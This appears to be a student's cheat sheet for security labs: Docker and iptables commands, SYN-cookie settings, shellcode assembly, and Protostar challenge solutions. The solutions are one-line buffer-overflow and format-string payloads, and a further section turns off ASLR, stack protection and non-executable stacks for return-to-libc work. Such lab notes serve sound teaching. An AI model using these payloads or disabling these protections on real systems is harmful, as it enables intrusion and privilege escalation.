## Docker Setup

### docker-compose

> docker-compose build
> docker-compos up
> docker-compose down

To find out the ID of the container:
> docker ps --format "{{.ID}} {{.Names}}"

To start a shell on that container:
> docker exec -it <the_id> /bin/bash
Or:
> "f(){ sudo docker exec -it $1 /bin/bash; unset -f f;} f"

To restart a container:
> docker restart < Container ID >

### Docker utilities

> docker network ls

* * *

## TCP Network Attacks

### SYN Cookie Countermeasure

Display the SYN cookie flag
> sysctl -a | grep syncookies 

Turn off and on:
> sysctl -w net.ipv4.tcp_syncookies=0 # turn off SYN cookie
> sysctl -w net.ipv4.tcp_syncookies=1 # turn on SYN cookie

### Network utilities

You can check the listening ports and applications:
> sudo ss -tulwn
> sudo ss -tulwn | grep LISTEN

TCP Retransmission:
> sysctl net.ipv4.tcp_synack_retries

### Connection queue

See/set half-opened connection queue (i.e., the connections that has finished SYN, SYN-ACK, but has not yet gotten a final ACK back):
> sysctl net.ipv4.tcp_max_syn_backlog
> net.ipv4.tcp_max_syn_backlog = 128

To see how many items are in the queue:
> netstat -tna | grep SYN_RECV | wc -l
Or:
> ss -n state syn-recv sport = :23 | wc -l

To see the usage of the queue:
> netstat -nat

### Kernel mitiagation mechanism

To remove the effect of this mitigation method:
> ip tcp_metrics show
> ip tcp_metrics flush

* * *

## Firewalls

### Simple kernel module

To show information about a Linux Kernel module:
> modinfo hello.ko

Inserting a module:
> sudo insmod hello.ko 

List modules:
> lsmod | grep hello

Remove modules:
> sudo rmmod hello

Check the message:
> dmesg

### Iptables

*iptables* is a user-space utility program that allows a system administrator to configure the IP packet filter rules of the Linux kernel firewall, implemented as different *Netfilter* modules.

General structure of *iptables* command:
iptables -t < table > -< operation > < chain > < rule > -j < target >

List all the rules in a table (without line number):
> iptables -t nat -L -n

List all the rules in a table (with line number):
> iptables -t filter -L -n --line-numbers

Delete rule No. 2 in the INPUT chain of the filter table:
> iptables -t filter -D INPUT 2

Drop all the incoming packets that satisfy the < rule >:
> iptables -t filter -A INPUT < rule > -j DROP

To find out all the ICMP match options:
> iptables -p icmp -h
Or for tcp
> iptables -p tcp -h
Examples:
> iptables -A FORWARD -p icmp --icmp-type echo-request -j DROP
> iptables -A FORWARD -i eth0 -o eth1 -p tcp --sport 5000 -j ACCEPT


* * *

## Shellcode Utilities / Assembly

Compiling to object code:
> nasm -f elf32 mysh.s -o mysh.o

Linking to generate final binary:
> ld -m elf_i386 mysh.o -o mysh

Getting the machine code:
> objdump -M intel --disassemble mysh.o

Print out the content of the binary file:
> xxd -p -c 20 mysh.o


* * *

## pwn / protostar

### Utilities

Run python code as an argument of a program:
>  ./heap0 `python -c 'print "A"*72+"\x64\x84\x04\x08"'`
Or:
> ./stack1 $(python -c "print 'a' * 64")

### Challenges

#### stack1

61 62 63 64
>  ./stack1 $(python -c "print 'a' * 64 + '\x64\x63\x62\x61' ")
(with correct endianness)

#### stack2

Set env var:
> GREENIE=$(python -c "print 64*'B' +'\x0a\x0d\x0a\x0d'")

#### stack3

> python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3

#### stack4

> python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4

#### heap0

Usefull:
gdb > info proc map (see the address of the heap)
x/120x heap_addr

> ./heap0 $(python -c "print 'A' * 72 + '\x64\x84\x04\x08'")

#### heap1

The goal of the first argument is to overflow i1->name heap buffer into the i2 structure and overwrite the address of i2->name with the address of either the saved_EIP or puts_GOT address. The goal of the second argument is to simply provide the address to which the execution will be redirected.

#### format0

One method of exploiting format strings is pretty similar to buffer overflows. You can write a large string into a buffer with a relatively short format string. E.g.: a format string %128d results in a 128 byte string.

> ./format0 $(python -c "print '%64x'+'\xef\xbe\xad\xde'")

#### format1

To find all the symbols from the binary:
> objdump -t filename
	In this way we can find the address of the target variable.
	
Best way to find the correct padding: 
> ./format1 $(python -c "print 'AAAA'+ '%x.'*150 + '%x' ")
	-> change the 150 value
	-> at the end replace AAAA with the address
	Or:
> ./format1 $(python -c "print 'AAAA' + '%p|'*156") && echo
	
We use %n to modify the target variable.
%n = Writes the number of characters in the address given as argument.
(or number of characters that have been printed so far)


* * *

## Return to libc

### Turning off countermeasures

- Address Space Randomization:
	> sudo sysctl -w kernel.randomize_va_space=0
- The StackGuard Protection Scheme:
	> gcc -m32 -fno-stack-protector example.c
- Non-Executable Stack:
	> gcc -m32 -z execstack -o test test.c
	> gcc -m32 -z noexecstack -o test test.c
- Configuring /bin/sh (since /bin/dash drops the priviliges)
	> sudo ln -sf /bin/zsh /bin/sh
